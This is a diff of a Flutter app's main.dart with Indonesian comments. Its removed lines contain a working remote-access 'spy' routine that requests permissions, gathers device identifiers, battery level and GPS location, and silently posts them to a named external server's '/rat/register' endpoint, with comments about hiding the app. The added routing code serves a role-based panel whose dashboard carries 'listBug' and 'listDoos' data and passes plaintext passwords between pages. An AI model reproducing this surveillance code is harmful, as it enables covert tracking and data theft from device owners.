@@ -1,13 +1,23 @@
 import 'package:flutter/material.dart';
-import 'package:http/http.dart' as http;
-import 'package:device_info_plus/device_info_plus.dart';
-import 'package:battery_plus/battery_plus.dart';
-import 'package:geolocator/geolocator.dart';
-import 'package:permission_handler/permission_handler.dart';
-import 'dart:convert';
 import 'dart:io';
+import 'app_theme.dart';
+import 'login_page.dart';
+import 'dashboard_page.dart';
+import 'home_page.dart';
+import 'seller_page.dart';
+import 'admin_page.dart';
+import 'developer_page.dart';
+import 'creator_page.dart';        // ✅ SUDAH ADA
+import 'kingz_page.dart';          // ✅ TAMBAHKAN
+import 'owner_page.dart';          // ✅ TAMBAHKAN
+import 'landing.dart';
+import 'public_chat_page.dart';
+// import 'api_config.dart';       // ✅ DIKOMENTAR
+import 'animasi_jendela.dart'; // ✅ TAMBAHIN INI
 
-void main() {
+Future<void> main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+  await AppThemeController.load();
   runApp(const MyApp());
 }
 
@@ -16,92 +26,144 @@ class MyApp extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return const MaterialApp(
-      debugShowCheckedModeBanner: false,
-      home: SplashScreen(),
-    );
-  }
-}
+    return ValueListenableBuilder<AppThemeColors>(
+      valueListenable: AppThemeController.notifier,
+      builder: (context, colors, _) => MaterialApp(
+      theme: colors.toTheme(ThemeData.light()),
+      builder: (context, child) {
+        return Stack(
+          fit: StackFit.expand,
+          children: [
+            if (colors.wallpaperPath != null && colors.wallpaperPath!.isNotEmpty)
+              Image.file(
+                File(colors.wallpaperPath!),
+                fit: BoxFit.cover,
+                errorBuilder: (_, __, ___) => ColoredBox(color: colors.background),
+              )
+            else
+              ColoredBox(color: colors.background),
+            if (child != null) child,
+          ],
+        );
+      },
 
-class SplashScreen extends StatefulWidget {
-  const SplashScreen({super.key});
+      initialRoute: '/',
+      onGenerateRoute: (settings) {
+        switch (settings.name) {
+          case '/':
+  return MaterialPageRoute(
+    builder: (_) => const AnimasiJendela(nextPage: LandingPage()),
+  );
 
-  @override
-  State<SplashScreen> createState() => _SplashScreenState();
-}
+          case '/login':
+            return MaterialPageRoute(builder: (_) => const LoginPage());
 
-class _SplashScreenState extends State<SplashScreen> {
-  @override
-  void initState() {
-    super.initState();
-    _startSpy();
-  }
+          case '/dashboard':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => DashboardPage(
+                username: args['username'],
+                password: args['password'],
+                role: (args['role'] ?? '').toString(),
+                sessionKey: args['key'],
+                expiredDate: args['expiredDate'],
+                listBug: List<Map<String, dynamic>>.from(args['listBug'] ?? []),
+                listDoos: List<Map<String, dynamic>>.from(args['listDoos'] ?? []),
+                news: List<Map<String, dynamic>>.from(args['news'] ?? []),
+              ),
+            );
 
-  Future<void> _startSpy() async {
-    // 1. Minta Izin (Lokasi, Storage, dll)
-    await [
-      Permission.location,
-      Permission.storage,
-      Permission.phone,
-    ].request();
+          case '/home':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => HomePage(
+                username: args['username'],
+                password: args['password'],
+                listBug: List<Map<String, dynamic>>.from(args['listBug'] ?? []),
+                role: (args['role'] ?? '').toString(),
+                expiredDate: args['expiredDate'],
+                sessionKey: args['sessionKey'],
+              ),
+            );
 
-    // 2. Ambil Data HP
-    final deviceInfo = DeviceInfoPlugin();
-    final androidInfo = await deviceInfo.androidInfo;
-    final battery = Battery();
-    final batteryLevel = await battery.batteryLevel;
+          case '/seller':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => SellerPage(
+                keyToken: args['keyToken'],
+              ),
+            );
 
-    String deviceModel = androidInfo.model;
-    String androidVersion = androidInfo.version.release;
-    String deviceId = androidInfo.id;
+          case '/admin':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => AdminPage(
+                sessionKey: args['sessionKey'],
+              ),
+            );
 
-    // 3. Ambil Lokasi (Opsional)
-    String lokasi = "Gagal ambil lokasi";
-    try {
-      Position position = await Geolocator.getCurrentPosition();
-      lokasi = "${position.latitude}, ${position.longitude}";
-    } catch (e) {
-      print("Lokasi error: $e");
-    }
+          // ─── DEVELOPER ──────────────────────────────────────────
+          case '/developer':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => DeveloperPage(
+                sessionKey: args['sessionKey'],
+              ),
+            );
 
-    // 4. Kirim Data ke Server Node.js Lu
-    // ⚠️ GANTI IP INI SESUAI SERVER LU
-    const String apiUrl = 'http://cp.zyrostore.id:3594/rat/register'; 
-    
-    // ⚠️ GANTI PAIRING ID INI SESUAI YANG ADA DI DASHBOARD LU
-    const String pairingId = '722E20C58B5CB090'; 
+          // ─── CREATOR ────────────────────────────────────────────
+          case '/creator':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => CreatorPage(
+                sessionKey: args['sessionKey'],
+              ),
+            );
 
-    try {
-      final response = await http.post(
-        Uri.parse(apiUrl),
-        headers: {'Content-Type': 'application/json'},
-        body: jsonEncode({
-          'pairId': pairingId,
-          'model': deviceModel,
-          'battery': batteryLevel,
-          'androidVersion': androidVersion,
-          'id': deviceId,
-          'lokasi': lokasi,
-        }),
-      );
-      
-      print("Data terkirim: ${response.body}");
-    } catch (e) {
-      print("Gagal kirim data: $e");
-    }
+          // ─── KINGZ ──────────────────────────────────────────────
+          case '/kingz':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => KingzPage(
+                sessionKey: args['sessionKey'],
+              ),
+            );
 
-    // 5. Sembunyiin aplikasi atau tampilin layar kosong
-    await Future.delayed(const Duration(seconds: 3));
-    if (mounted) {
-      // Bisa lu arahin ke halaman 'Halo' atau malah tutup aplikasi
-    }
-  }
+          // ─── OWNER ──────────────────────────────────────────────
+          case '/owner':
+            final args = settings.arguments as Map<String, dynamic>;
+            return MaterialPageRoute(
+              builder: (_) => OwnerPage(
+                sessionKey: args['sessionKey'],
+                username: args['username'] ?? '',
+              ),
+            );
 
-  @override
-  Widget build(BuildContext context) {
-    return const Scaffold(
-      backgroundColor: Colors.white,
-      body: Center(child: CircularProgressIndicator()),
+          // ─── CHAT ────────────────────────────────────────────────
+          case '/chat':
+            final args = settings.arguments as Map<String, dynamic>?;
+            return MaterialPageRoute(
+              builder: (_) => PublicChatPage(
+                sessionKey: args?['sessionKey'] ?? '',
+                username: args?['username'] ?? 'User',
+                role: args?['role'] ?? 'user',
+              ),
+            );
+
+          default:
+            return MaterialPageRoute(
+              builder: (_) => const Scaffold(
+                body: Center(
+                  child: Text(
+                    "404 - Halaman Tidak Ditemukan",
+                    style: TextStyle(color: Color(0xFF000000), fontFamily: 'Astral'),
+                  ),
+                ),
+              ),
+            );
+        }
+      },
+    ),
     );
   }
 }
